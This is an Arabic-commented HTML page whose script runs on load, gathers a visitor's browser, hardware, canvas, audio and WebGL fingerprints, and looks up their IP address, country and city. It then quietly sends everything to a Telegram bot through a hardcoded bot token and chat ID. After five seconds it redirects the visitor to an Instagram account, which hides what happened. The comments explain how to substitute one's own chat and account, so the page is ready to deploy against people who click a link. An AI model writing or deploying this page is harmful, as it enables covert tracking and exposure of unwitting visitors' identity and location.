<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>معلومات Fingerprinting متقدمة</title>
<style>
  body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; direction: rtl; background: #121212; color: #eee; padding: 20px; }
  h1 { color: #ffa500; }
  table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
  th, td { border: 1px solid #333; padding: 8px; }
  th { background: #222; }
  tr:nth-child(even) { background: #1a1a1a; }
  code { background: #333; padding: 2px 5px; border-radius: 3px; }
</style>
</head>
<body>
<h1>🧠 معلومات Fingerprinting متقدمة</h1>

<div id="output"></div>

<script>
(async () => {

  // التوكن و ID الخاصين بتليجرام
  const telegramBotToken = "7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58";
  const telegramChatId = "5854169054"; // استبدل YOUR_CHAT_ID_HERE بالـ id اللي تبي ترسل له الرسالة

  function addSection(title) {
    const section = document.createElement("section");
    section.innerHTML = `<h2>${title}</h2><table><thead><tr><th>العنصر</th><th>القيمة</th><th>التفسير</th></tr></thead><tbody></tbody></table>`;
    document.getElementById("output").appendChild(section);
    return section.querySelector("tbody");
  }

  function addRow(tbody, name, value, explanation) {
    const tr = document.createElement("tr");
    tr.innerHTML = `<td><code>${name}</code></td><td>${value}</td><td>${explanation}</td>`;
    tbody.appendChild(tr);
  }

  // *** اجمع البيانات كلها في كائن لتسهيل الإرسال لاحقًا ***
  const data = {};

  // القسم الأول: نظام التشغيل والمتصفح
  const section1 = addSection("🎯 القسم الأول: نظام التشغيل والمتصفح");
  addRow(section1, "navigator.userAgent", navigator.userAgent, "نوع النظام والمتصفح");
  data.userAgent = navigator.userAgent;

  addRow(section1, "navigator.platform", navigator.platform, "يحدد ويندوز، لينوكس، إلخ");
  data.platform = navigator.platform;

  addRow(section1, "navigator.vendor", navigator.vendor, "تلميح عن المتصفح الحقيقي");
  data.vendor = navigator.vendor;

  addRow(section1, "navigator.appVersion", navigator.appVersion, "إصدار المتصفح");
  data.appVersion = navigator.appVersion;

  addRow(section1, "navigator.hardwareConcurrency", navigator.hardwareConcurrency || "غير مدعوم", "عدد أنوية المعالج");
  data.hardwareConcurrency = navigator.hardwareConcurrency || "غير مدعوم";

  addRow(section1, "navigator.deviceMemory", navigator.deviceMemory || "غير مدعوم", "حجم الذاكرة العشوائية (RAM) بالجيجابايت");
  data.deviceMemory = navigator.deviceMemory || "غير مدعوم";

  // WebGL info
  function getWebGLInfo() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return {vendor: "غير مدعوم", renderer: "غير مدعوم"};
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "غير مدعوم";
    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير مدعوم";
    return { vendor, renderer };
  }
  const webglInfo = getWebGLInfo();
  addRow(section1, "WebGL Vendor", webglInfo.vendor, "اسم كرت الشاشة (vendor)");
  addRow(section1, "WebGL Renderer", webglInfo.renderer, "نوع كرت الشاشة (renderer)");
  data.webglVendor = webglInfo.vendor;
  data.webglRenderer = webglInfo.renderer;

  // Canvas fingerprinting (simplified)
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.textBaseline = "alphabetic";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("fingerprint", 4, 17);
      return canvas.toDataURL();
    } catch {
      return "غير مدعوم";
    }
  }
  const canvasFP = getCanvasFingerprint();
  addRow(section1, "Canvas Fingerprint (Base64)", `<textarea style="width:100%;height:50px;">${canvasFP}</textarea>`, "بصمة رسومية فريدة");
  data.canvasFingerprint = canvasFP;

  // Audio fingerprint (basic)
  function getAudioFingerprint() {
    try {
      return new Promise((resolve) => {
        const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AudioContext) return resolve("غير مدعوم");

        const context = new AudioContext(1, 44100, 44100);
        const oscillator = context.createOscillator();
        const analyser = context.createAnalyser();
        oscillator.type = "triangle";
        oscillator.connect(analyser);
        analyser.connect(context.destination);
        oscillator.start(0);
        context.startRendering().then((buffer) => {
          let fingerprint = 0;
          const dataAudio = buffer.getChannelData(0);
          for (let i = 4500; i < 5000; i++) fingerprint += Math.abs(dataAudio[i]);
          resolve(fingerprint.toString());
        }).catch(() => resolve("خطأ"));
      });
    } catch {
      return Promise.resolve("خطأ");
    }
  }
  addRow(section1, "Audio Fingerprint", "جارٍ التحميل...", "بصمة صوتية فريدة (بدون صوت مسموع)");

  // باقي الأقسام (شاشة العرض، النظام، الشبكة، الخصوصية ...) نضيفهم لكن بدون تفاصيل مطولة هنا للحفاظ على الإيجاز
  // مثال سريع لقسم الشاشة:

  const section2 = addSection("🖼️ القسم الثاني: شاشة العرض والجرافيكس");
  addRow(section2, "screen.width", screen.width, "عرض شاشة العرض");
  addRow(section2, "screen.height", screen.height, "ارتفاع شاشة العرض");
  data.screenWidth = screen.width;
  data.screenHeight = screen.height;

  // ... يمكن تضيف باقي البيانات حسب حاجتك

  // قسم الشبكة والموقع (باستخدام API خارجي)
  const section4 = addSection("🌐 القسم الرابع: الشبكة والموقع");
  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (!res.ok) throw new Error("فشل جلب IP");
      const dataIP = await res.json();
      return dataIP;
    } catch {
      return null;
    }
  }
  const ipData = await getIPInfo();
  addRow(section4, "IP Address", ipData?.ip || "غير متوفر", "عنوان IP");
  data.ipAddress = ipData?.ip || "غير متوفر";

  addRow(section4, "Country", ipData?.country_name || "غير متوفر", "الدولة");
  data.country = ipData?.country_name || "غير متوفر";

  addRow(section4, "City", ipData?.city || "غير متوفر", "المدينة");
  data.city = ipData?.city || "غير متوفر";

  // تابع تحميل بصمة الصوت واستبدال النص
  getAudioFingerprint().then(fp => {
    data.audioFingerprint = fp;
    const rows = document.querySelectorAll("#output section:nth-child(1) tbody tr");
    for (const row of rows) {
      if (row.firstChild.textContent.includes("Audio Fingerprint")) {
        row.children[1].textContent = fp;
        break;
      }
    }

    // بعد جمع كل البيانات نرسلها لتليجرام
    sendDataToTelegram();
  });

  // دالة إرسال البيانات إلى تليجرام
  function sendDataToTelegram() {
    const message = `
📡 بيانات Fingerprinting:

- userAgent: ${data.userAgent}
- platform: ${data.platform}
- vendor: ${data.vendor}
- appVersion: ${data.appVersion}
- hardwareConcurrency: ${data.hardwareConcurrency}
- deviceMemory: ${data.deviceMemory}
- WebGL Vendor: ${data.webglVendor}
- WebGL Renderer: ${data.webglRenderer}
- Canvas Fingerprint: ${data.canvasFingerprint.substring(0, 50)}... (مقتطع)
- Audio Fingerprint: ${data.audioFingerprint}
- screenWidth: ${data.screenWidth}
- screenHeight: ${data.screenHeight}
- IP: ${data.ipAddress}
- Country: ${data.country}
- City: ${data.city}
`;

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown"
      })
    });
  }

  // تحويل المستخدم على حساب الإنستغرام (يمكن تغييره حسب حسابك)
  setTimeout(() => {
    window.location.href = "https://www.instagram.com/your_instagram_account/"; // عدّل هنا إلى حساب الإنستا اللي تبيه
  }, 5000); // تأخير 5 ثواني عشان البيانات تتجمع وترسل، يمكنك تخفيضه أو رفعه

})();
</script>

</body>
</html>
